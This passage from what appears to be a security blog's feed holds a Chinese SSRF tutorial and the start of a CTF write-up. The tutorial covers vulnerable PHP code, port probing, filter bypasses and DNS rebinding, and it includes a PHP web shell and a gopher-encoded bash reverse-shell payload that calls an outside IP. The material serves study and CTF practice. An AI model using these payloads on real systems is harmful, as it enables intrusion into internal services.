href="https://www.jianshu.com/p/33bc37ef72cc">花式列目录，花式读文件</a></li><li><a href="http://blog.51cto.com/lovexm/1743442">http://blog.51cto.com/lovexm/1743442</a></li><li><a href="http://hpdoger.me/2018/12/21/Code-Breaking-Puzzles%20WriteUp">http://hpdoger.me/2018/12/21/Code-Breaking-Puzzles%20WriteUp</a></li><li><a href="https://paper.tuisec.win/detail/a9ad1440249d95b">Unicode安全</a></li><li><a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">Fuzz中的javascript大小写特性</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF 学习笔记</title>
      <link href="/2018/11/23/SSRF-notes/"/>
      <url>/2018/11/23/SSRF-notes/</url>
      
        <content type="html"><![CDATA[<h1 id="SSRF概述"><a href="#SSRF概述" class="headerlink" title="SSRF概述"></a>SSRF概述</h1><p>SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制。</p><h2 id="形成原因"><a href="#形成原因" class="headerlink" title="形成原因"></a>形成原因</h2><p>漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制。</p><p>常出现在一下场景中：</p><ol><li>分享：通过url地址分享网页内容</li><li>通过url地址加载或者下载图片</li><li>从远程服务器请求资源（Upload from URL，Import &amp; Export RSS Feed）</li><li>数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB）</li><li>文件处理、编码处理、属性信息处理（ffmpeg、ImageMagic、DOCX、PDF、XML）</li><li>Webmail 收取其他邮箱邮件（POP3、IMAP、SMTP）</li><li>其他调用url或者类似出现==站内站==的情况，能够对外发起网络请求的地方，就可能存在 SSRF 漏洞</li></ol><p><strong>辨别SSRF</strong>：</p><ul><li>在线识图，在线文档翻译，分享，订阅等，这些有的都会发起网络请求。</li><li>根据远程 URL 上传，静态资源图片等，这些会请求远程服务器的资源。</li><li>数据库的比如 mongodb 的 copyDatabase 函数。</li><li>邮件系统就是接收邮件服务器地址这些地方。</li><li>文件就找 ImageMagick，xml 这些。</li><li>从 URL 关键字中寻找，比如：source,share,link,src,imageurl,target 等。</li></ul><h2 id="常见后端实现"><a href="#常见后端实现" class="headerlink" title="常见后端实现"></a>常见后端实现</h2><h3 id="php后端实现"><a href="#php后端实现" class="headerlink" title="php后端实现"></a>php后端实现</h3><ol><li><p><code>file_get_contents</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_POST[&#39;url&#39;])) &#123; </span><br><span class="line">    $content &#x3D; file_get_contents($_POST[&#39;url&#39;]); </span><br><span class="line">    $filename &#x3D;&#39;.&#x2F;images&#x2F;&#39;.rand().&#39;;img1.jpg&#39;; </span><br><span class="line">    file_put_contents($filename, $content); </span><br><span class="line">    echo $_POST[&#39;url&#39;]; </span><br><span class="line">    $img &#x3D; &quot;&lt;img src&#x3D;\&quot;&quot;.$filename.&quot;\&quot;&#x2F;&gt;&quot;; </span><br><span class="line">&#125;</span><br><span class="line">echo $img;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这段代码使用 <code>file_get_contents</code> 函数从用户指定的 URL 获取图片。然后把它用一个随机文件名保存在硬盘上，并展示给用户。<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/20181122233458.png"></p></li><li><p><code>fsockopen()</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function GetFile($host,$port,$link) &#123; </span><br><span class="line">    $fp &#x3D; fsockopen($host, intval($port), $errno, $errstr, 30); </span><br><span class="line">    if (!$fp) &#123; </span><br><span class="line">        echo &quot;$errstr (error number $errno) \n&quot;; </span><br><span class="line">    &#125; else &#123; </span><br><span class="line">        $out &#x3D; &quot;GET $link HTTP&#x2F;1.1\r\n&quot;; </span><br><span class="line">        $out .&#x3D; &quot;Host: $host\r\n&quot;; </span><br><span class="line">        $out .&#x3D; &quot;Connection: Close\r\n\r\n&quot;; </span><br><span class="line">        $out .&#x3D; &quot;\r\n&quot;; </span><br><span class="line">        fwrite($fp, $out); </span><br><span class="line">        $contents&#x3D;&#39;&#39;; </span><br><span class="line">        while (!feof($fp)) &#123; </span><br><span class="line">            $contents.&#x3D; fgets($fp, 1024); </span><br><span class="line">        &#125; </span><br><span class="line">        fclose($fp); </span><br><span class="line">        return $contents; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这段代码使用 <code>fsockopen</code> 函数实现获取用户制定 URL 的数据（文件或者 HTML）。这个函数会使用 socket 跟服务器建立 TCP 连接，传输原始数据。</p></li><li><p><code>curl_exec()</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if (isset($_POST[&#39;url&#39;])) &#123;</span><br><span class="line">    $link &#x3D; $_POST[&#39;url&#39;];</span><br><span class="line">    $curlobj &#x3D; curl_init();</span><br><span class="line">    curl_setopt($curlobj, CURLOPT_POST, 0);</span><br><span class="line">    curl_setopt($curlobj,CURLOPT_URL,$link);</span><br><span class="line">    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">    $result&#x3D;curl_exec($curlobj);</span><br><span class="line">    curl_close($curlobj);</span><br><span class="line"></span><br><span class="line">    $filename &#x3D; &#39;.&#x2F;curled&#x2F;&#39;.rand().&#39;.txt&#39;;</span><br><span class="line">    file_put_contents($filename, $result); </span><br><span class="line">    echo $result;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>使用 <code>curl</code> 获取数据。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/20181122232408.png"></p></li></ol><h3 id="python后端实现"><a href="#python后端实现" class="headerlink" title="python后端实现"></a>python后端实现</h3><p>python通常使用<code>urllib</code>库</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1&#x27;</span></span><br><span class="line">info = urllib.urlopen(url)</span><br><span class="line">print(info.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><h1 id="SSRF利用"><a href="#SSRF利用" class="headerlink" title="SSRF利用"></a>SSRF利用</h1><p>攻击者可以利用 SSRF 实现的攻击主要有 5 种：</p><ol><li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息</li><li>攻击运行在内网或本地的应用程序（比如溢出）</li><li>对内网 WEB 应用进行指纹识别，通过访问默认文件实现</li><li>攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击（比如 Struts2，sqli，redis等）</li><li>利用 <code>file</code> 协议读取本地文件等</li></ol><p>curl 支持很多协议，可以通过<code>curl -V</code>查看</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ curl -V</span><br><span class="line">curl 7.47.0 (x86_64-pc-linux-gnu) libcurl&#x2F;7.47.0 GnuTLS&#x2F;3.4.10 zlib&#x2F;1.2.8 libidn&#x2F;1.32 librtmp&#x2F;2.3   </span><br><span class="line"></span><br><span class="line">Protocols: dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtmp rtsp smb smbs smtp smtps telnet tftp   </span><br><span class="line"></span><br><span class="line">Features: AsynchDNS IDN IPv6 Largefile GSS-API Kerberos SPNEGO NTLM NTLM_WB SSL libz TLS-SRP UnixSockets </span><br></pre></td></tr></table></figure><p>其中<code>file</code>,<code>dict</code>,<code>gopher</code>协议常用。   </p><h2 id="1-利用-file-协议读取本地文件"><a href="#1-利用-file-协议读取本地文件" class="headerlink" title="1. 利用 file 协议读取本地文件"></a>1. 利用 file 协议读取本地文件</h2><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/20181123180810.png"></p><p>类似的，可以读取配置文件和</p><h2 id="2-利用dict协议探测端口"><a href="#2-利用dict协议探测端口" class="headerlink" title="2. 利用dict协议探测端口"></a>2. 利用dict协议探测端口</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -v &#39;dict:&#x2F;&#x2F;127.0.0.1:22&#39;</span><br><span class="line">curl -v &#39;dict:&#x2F;&#x2F;127.0.0.1:6379&#x2F;info&#39;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/2018-11-23_00003.png"></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/20181123191510.png"></p><p>有返回的页面就说端口是开放的。</p><h2 id="3-利用gopher协议"><a href="#3-利用gopher协议" class="headerlink" title="3. 利用gopher协议"></a>3. 利用gopher协议</h2><blockquote><p>Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。当然现在 Gopher 协议已经慢慢淡出历史。<br>Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。</p></blockquote><p>推荐一篇非常好的文章    <a href="https://blog.chaitin.cn/gopher-attack-surfaces/">利用 Gopher 协议拓展攻击面</a></p><h3 id="最简单的实例"><a href="#最简单的实例" class="headerlink" title="最简单的实例"></a>最简单的实例</h3><p>Gopher 可以模仿 POST 请求，故探测内网的时候不仅可以利用 GET 形式的 PoC（经典的 Struts2），还可以使用 POST 形式的 PoC。<br>一个只能 127.0.0.1 访问的 exp.php，内容为：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php system($_POST[e]);?&gt;  </span><br></pre></td></tr></table></figure><p>利用方式：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;exp.php HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: curl&#x2F;7.43.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Content-Length: 49</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">e&#x3D;bash -i &gt;%26 &#x2F;dev&#x2F;tcp&#x2F;172.19.23.228&#x2F;2333 0&gt;%261</span><br></pre></td></tr></table></figure><p>构造 Gopher 协议的 URL：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST &#x2F;exp.php HTTP&#x2F;1.1%0d%0aHost: 127.0.0.1%0d%0aUser-Agent: curl&#x2F;7.43.0%0d%0aAccept: *&#x2F;*%0d%0aContent-Length: 49%0d%0aContent-Type: application&#x2F;x-www-form-urlencoded%0d%0a%0d%0ae&#x3D;bash -i &gt;%2526 &#x2F;dev&#x2F;tcp&#x2F;172.19.23.228&#x2F;2333 0&gt;%25261null</span><br></pre></td></tr></table></figure><p>湖湘杯2018的一道SSRF考察的就是这一点，下面是读文件拿到的源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;ssrf me with parameter &#x27;url&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$ch = curl_init(); </span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_GET[<span class="string">&#x27;url&#x27;</span>]); </span><br><span class="line"><span class="comment">//echo $_GET[&#x27;url&#x27;];</span></span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span></span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line"><span class="keyword">echo</span> curl_exec($ch); </span><br><span class="line">curl_close($ch); </span><br><span class="line"></span><br><span class="line"><span class="comment">//var_dump($_POST);</span></span><br><span class="line">$ip = $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">  <span class="keyword">if</span>($_POST[<span class="string">&#x27;user&#x27;</span>]==<span class="string">&quot;admin&quot;</span> &amp;&amp; $ip==<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">    system(<span class="string">&quot;/var/www/html/ssrf/readflag&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>之后利用gopher协议可以绕过ip的检测，从而执行程序，获取flag。</p><p>题目详解和exp，可参考<a href="http://v0w.top/2018/11/18/hxb2018-WP/">我的博客——湖湘杯WP</a></p><h3 id="稍复杂一点的情况"><a href="#稍复杂一点的情况" class="headerlink" title="稍复杂一点的情况"></a>稍复杂一点的情况</h3><p>利用gopher攻击内网中的一些有漏洞的应用等，如长亭文章中所说，利用gopher协议攻击redis应用。主要攻击 redis、discuz、fastcgi、memcache、内网脆弱应用这几类应用<br>// TODO</p><h1 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h1><ol><li>限制协议为 HTTP、HTTPS，需求不需要，就不要开类似gopher，file，ftp协议</li><li>禁止 30x 跳转</li><li>设置 URL 白名单或者限制内网 IP</li><li>服务端需要鉴权（Cookies &amp; User：Pass）不能完美利用</li></ol><h1 id="Some-Tricks-in-SSRF"><a href="#Some-Tricks-in-SSRF" class="headerlink" title="Some Tricks in SSRF"></a>Some Tricks in SSRF</h1><h2 id="1-简单过滤的绕过"><a href="#1-简单过滤的绕过" class="headerlink" title="1. 简单过滤的绕过"></a>1. 简单过滤的绕过</h2><p><a href="http://127.0.0.1/">http://127.0.0.1/</a> 等内网地址被过滤的时候，可以尝试一下几种方式：</p><ol><li><p>@或#  </p> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;abc@127.0.0.1</span><br><span class="line">127.0.0.1#http:&#x2F;&#x2F;abc</span><br></pre></td></tr></table></figure></li><li><p>Som添加端口号</p> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080</span><br></pre></td></tr></table></figure></li><li><p>短地址</p> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;dwz.cn&#x2F;11SMa</span><br></pre></td></tr></table></figure></li><li><p>可以指向任意 ip 的域名：xip.io</p> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.0.0.1.xip.io 10.0.0.1</span><br><span class="line">www.10.0.0.1.xip.io 10.0.0.1</span><br><span class="line">mysite.10.0.0.1.xip.io 10.0.0.1</span><br><span class="line">foo.bar.10.0.0.1.xip.io 10.0.0.1</span><br></pre></td></tr></table></figure></li><li><p>ip 地址转换成进制来访问</p> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &#x3D; 0x7f000001 &#x3D; 0x7f.0x00.0x00.0x01</span><br></pre></td></tr></table></figure></li><li><p>利用dns将域名解析为内网ip。</p> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;test.th1s.cn-&gt;10.1.1.1</span><br></pre></td></tr></table></figure></li><li><p>利用301或者302跳转</p> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.th1s.cn&#x2F;test&#x2F;ssrf.php</span><br><span class="line">ssrf.php里面的内容为：</span><br><span class="line">&lt;?php header(&#39;Location:10.1.1.1&#39;);?&gt;</span><br></pre></td></tr></table></figure></li><li><p>句号绕过 127。0。0。1</p></li><li><p>Enclosed alphanumerics绕过</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com</span><br><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ </span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ </span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ </span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ </span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ </span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ </span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ </span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure></li></ol><h2 id="2-parse-url与libcurl对curl的解析差异"><a href="#2-parse-url与libcurl对curl的解析差异" class="headerlink" title="2. parse_url与libcurl对curl的解析差异"></a>2. parse_url与libcurl对curl的解析差异</h2><p><strong>hgame2019 week2 php-trick</strong>的部分代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = @$_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (parse_url($url, PHP_URL_HOST) !== <span class="string">&quot;www.baidu.com&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 9 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (parse_url($url,PHP_URL_SCHEME) !== <span class="string">&quot;http&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 10 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">$output = curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="keyword">if</span>($output === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 11 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此题就是考察就是<a href="">利用parse_url与libcurl对curl的解析差异的trick</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">完整url: scheme:[&#x2F;&#x2F;[user[:password]@]host[:port]][&#x2F;path][?query][#fragment]</span><br><span class="line">这里仅讨论url中不含&#39;?&#39;的情况</span><br><span class="line"></span><br><span class="line">php parse_url：</span><br><span class="line">host: 匹配最后一个@后面符合格式的host</span><br><span class="line"></span><br><span class="line">libcurl：</span><br><span class="line">host：匹配第一个@后面符合格式的host</span><br></pre></td></tr></table></figure><p>如：<code>http://u:p@a.com:80@b.com/</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php  parse_url解析结果：</span><br><span class="line">    schema: http </span><br><span class="line">    user: u</span><br><span class="line">    pass: p@a.com:80</span><br><span class="line">    host: b.com</span><br><span class="line">    </span><br><span class="line">libcurl解析结果：</span><br><span class="line">    schema: http</span><br><span class="line">    host: a.com</span><br><span class="line">    user: u</span><br><span class="line">    pass: p</span><br><span class="line">    port: 80</span><br><span class="line">    后面的@b.com&#x2F;会被忽略掉</span><br></pre></td></tr></table></figure><p>所以上面的例题就可以通过这种方式绕过：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; $a = parse_url(<span class="string">&#x27;http://u:p@127.0.0.1:80@www.baidu.com/flag.php&#x27;</span>); var_dump($a);</span><br><span class="line"><span class="keyword">array</span>(<span class="number">5</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;scheme&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;http&quot;</span></span><br><span class="line">  [<span class="string">&quot;host&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">13</span>) <span class="string">&quot;www.baidu.com&quot;</span></span><br><span class="line">  [<span class="string">&quot;user&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;u&quot;</span></span><br><span class="line">  [<span class="string">&quot;pass&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">14</span>) <span class="string">&quot;p@127.0.0.1:80&quot;</span></span><br><span class="line">  [<span class="string">&quot;path&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;/flag.php&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>详细可以看看<a href="http://v0w.top/2019/02/10/Hgame2019-week2WP/#php-trick">我的WP</a></p><h2 id="3-trick1-filter-var-bypass"><a href="#3-trick1-filter-var-bypass" class="headerlink" title="3. trick1 filter_var() bypass"></a>3. trick1 filter_var() bypass</h2><p>看到很多大佬的文章都有提到，找到<a href="https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51">原文链接</a></p><p><strong>示例代码</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   $url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;Argument: &quot;</span>.$url.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">   <span class="keyword">if</span>(filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">      $r = parse_url($url);</span><br><span class="line">      var_dump($r);</span><br><span class="line">      <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/google\.com$/&#x27;</span>, $r[<span class="string">&#x27;host&#x27;</span>])) </span><br><span class="line">      &#123;</span><br><span class="line">         exec(<span class="string">&#x27;curl -v -s &quot;&#x27;</span>.$r[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&quot;&#x27;</span>, $a);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;Error: Host not allowed&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Error: Invalid URL&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mixed filter_var ( mixed $variable [, int $filter &#x3D; FILTER_DEFAULT [, mixed $options ]] )函数有两种参数。</span><br><span class="line">FILTER_VALIDATE_EMAIL 检查是否为有效邮箱</span><br><span class="line">FILTER_VALIDATE_URL 检查是否为有效url</span><br></pre></td></tr></table></figure><p>代码的逻辑是先判断，url是否符合逻辑，符合则用<code>preg_match</code>来匹配，匹配成功就curl</p><h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;web&#x2F;test&#x2F;22.php?url&#x3D;0:&#x2F;&#x2F;evil.com:80,google.com:80&#x2F;</span><br><span class="line">或</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;web&#x2F;test&#x2F;22.php?url&#x3D;0:&#x2F;&#x2F;evil.com:23333;google.com:80&#x2F;</span><br></pre></td></tr></table></figure><p>利用，或者；可以绕过。</p><blockquote><p>许多URL方案保留某些特殊含义的字符：它们在URL的特定于方案的部分中的外观具有指定的语义。如果在方案中保留对应于八位字节的字符，则必须对八位字节进行编码。字符“;”，“/”，“？”，“：”，“@”，“=”和“＆”可以保留用于方案内的特殊含义。在方案中不能保留其他字符。</p><p>除了分层路径中的点段之外，通用语法将路径段视为不透明。URI生成应用程序通常使用段中允许的保留字符来分隔特定于方案或解除引用处理程序的子组件。例如，<strong>分号</strong>（“;”）和<strong>等于</strong>（“=”）保留字符<strong>通常用于分隔</strong>适用于该段的<strong>参数和参数值</strong>。<strong>逗号</strong>（“，”）保留字符<strong>通常用于类似目的。</strong></p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Argument: 0:&#x2F;&#x2F;evil.com:2333;google.com:80</span><br><span class="line">array(3) &#123;</span><br><span class="line">  [&quot;scheme&quot;]&#x3D;&gt;</span><br><span class="line">  string(1) &quot;0&quot;</span><br><span class="line">  [&quot;host&quot;]&#x3D;&gt;</span><br><span class="line">  string(30) &quot;evil.com;google.com&quot;</span><br><span class="line">  [&quot;port&quot;]&#x3D;&gt;</span><br><span class="line">  int(80)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/02/23/5c7134680c695.png"></p><h2 id="4-DNS重绑攻击"><a href="#4-DNS重绑攻击" class="headerlink" title="4. DNS重绑攻击"></a>4. DNS重绑攻击</h2><p>网上原理多为文字，可能不太易懂，画图形象。</p><p><img src="https://i.loli.net/2019/01/15/5c3df58ad59ce.png" alt="https://i.loli.net/2019/01/15/5c3df58ad59ce.png"></p><p>关键是利用服务端第一次去请求DNS服务和第二次进行域名解析即访问URL之间的的时间差，利用这个时间差进行DNS重绑定攻击</p><p>还有就是DNS服务器需要设置TTL=0，TTL为DNS服务器里域名和IP绑定关系的cache存活的时间</p><p>实现方法：</p><ol><li>设置TTL，0ctF2016的monkey题目就是利用DNS重绑攻击绕过，国外域名一般可以设置TTL=0</li><li>还有种方法就是设置两条A记录给域名一个解析的ip为外网，另一个解析的ip为内网，那么这就成了概率问题，一次访问有1/4的概率访问内网</li><li>直接自建DNS服务器，比如dnspython等模块</li></ol><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="http://www.zerokeeper.com/web-security/ssrf-learning-notes.html">SSRF 学习笔记</a></li><li><a href="https://blog.chaitin.cn/gopher-attack-surfaces/">利用 Gopher 协议拓展攻击面</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/web/ssrf/">CTFwiki-SSRF</a></li><li><a href="https://xz.aliyun.com/t/2115">了解SSRF,这一篇就足够了</a></li><li><a href="https://www.freebuf.com/articles/web/20407.html">SSRF攻击实例解析</a></li><li><a href="https://www.th1s.cn/index.php/2017/02/28/66.html">ssrf bypass总结</a></li><li><a href="http://j0k3r.top/2019/01/30/SSRF/">http://j0k3r.top/2019/01/30/SSRF/</a></li><li><a href="https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51">https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51</a></li><li><a href="https://skysec.top/2018/03/15/Some%20trick%20in%20ssrf%20and%20unserialize()">https://skysec.top/2018/03/15/Some%20trick%20in%20ssrf%20and%20unserialize()</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>湖湘杯2018-WP</title>
      <link href="/2018/11/18/hxb2018-WP/"/>
      <url>/2018/11/18/hxb2018-WP/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>首先，这次湖湘杯的web出的真的差，多种非预期，多种环境问题，题目多次上线下线，还没有实时的分数榜？？？因为这次逆向和pwn不强，我们应该是无缘决赛了==、有点难受。。。</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2><p>签到题，进入公众号回复hxb2018即得。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image002.jpg"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag: hxb2018&#123;W3lc0me_T0_Hxb2o18&#125;</span><br></pre></td></tr></table></figure><h2 id="CodeCheck"><a href="#CodeCheck" class="headerlink" title="CodeCheck"></a>CodeCheck</h2><p>首先，进入维护通知，发现这个</p><p>/news/list.php</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image004.jpg"></p><p>进入/news</p><p><img 